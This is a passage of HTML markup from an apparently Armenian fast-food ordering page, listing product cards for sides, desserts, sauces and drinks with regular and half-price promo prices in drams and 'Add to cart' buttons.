                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">550֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Chicken-Stripes_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Strips</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>

                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Fries_-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Fries</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">360֏</div>
                                                                    <div class="promo-price">180֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Onion-Rings-8Pc-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Onion Rings</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">360֏</div>
                                                                    <div class="promo-price">180֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>

                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Chili_Cheese_Nuggets_6_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chilli Cheese Bites</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">420֏</div>
                                                                    <div class="promo-price">210֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Chicken_Fries_-1200x800_DE-2.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Fries</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">550֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Nuggets_5pc_1200x800.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Nuggets</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">750֏</div>
                                                                    <div class="promo-price">375֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <!--<li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/20120524_Fries-thumb.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Fries with Garlic Sauce</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">4.00</div>
                                                                    <div class="promo-price">2.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/2222.webp"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Cheese Sauce</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">2.00</div>
                                                                    <div class="promo-price">1.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/3333.webp"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Barbecue Sauce</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">2.00</div>
                                                                    <div class="promo-price">1.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>-->
                                        </ul>
                                    </div>
                                    <div class="_2K7f4-40">
                                        <div id="part_5" class="jy9vn-40"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">Աղանդեր</h2>
                                        <ul class="_2ActO-40">
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Oreo-Shake-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">OREO® SHAKE</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">500֏</div>
                                                                    <div class="promo-price">250֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Chocolate-Brownie-Hottie_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chocolate Brownie Hottie</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">180֏</div>
                                                                    <div class="promo-price">90֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/1200x800_Sweets_Deliveroo_King-Fusion-Smarties.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Smarties® Fusion</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">220֏</div>
                                                                    <div class="promo-price">110֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Oreo_Fusion_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">OREO®  Fusion</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">260֏</div>
                                                                    <div class="promo-price">130֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Sundaes_Caramel_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Caramel Sundae</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">180֏</div>
                                                                    <div class="promo-price">90֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Sundaes_Caramel_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Caramel Sundae</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">180֏</div>
                                                                    <div class="promo-price">90֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Sundaes_Strawberry_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Strawberry Sundae</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">180֏</div>
                                                                    <div class="promo-price">90֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Warme-Belgische-Waffel_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Warm Belgian Waffle</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">410֏</div>
                                                                    <div class="promo-price">205֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Apple_Pie_1200x800.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Apple Pie</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">410֏</div>
                                                                    <div class="promo-price">205֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="_2K7f4-40">
                                        <div id="part_3" class="jy9vn-40"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">Սոուսներ</h2>
                                        <ul class="_2ActO-40">
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_Dips_BBQ.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Smokey BBQ Dip</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">110֏</div>
                                                                    <div class="promo-price">55֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_Dips_Mayo.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Spicy Mayo</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">110֏</div>
                                                                    <div class="promo-price">55֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_Dips_SweetChili.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Sweet Chili</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">110֏</div>
                                                                    <div class="promo-price">55֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_Dips_Ketchup_v25.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Ketchup</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">110֏</div>
                                                                    <div class="promo-price">55֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_Dips_Garlic.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Garlic Sauce</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">110֏</div>
                                                                    <div class="promo-price">55֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_Dips_SourCream.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Sour Cream &amp; Chive Sauce</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">110֏</div>
                                                                    <div class="promo-price">55֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </div> 
                                    <div class="_2K7f4-40">
                                        <div id="part_6" class="jy9vn-40"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">Խմիչքներ</h2>
                                        <ul class="_2ActO-40">
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Cola_1200x800.png" style="height: 118px;"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Soft Drinks</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">620֏</div>
                                                                    <div class="promo-price">310֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/Tropicana-1200x800-2.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Orange Juice</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">620֏</div>
                                                                    <div class="promo-price">310֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/Coffee_1200x800.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Black Coffee</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
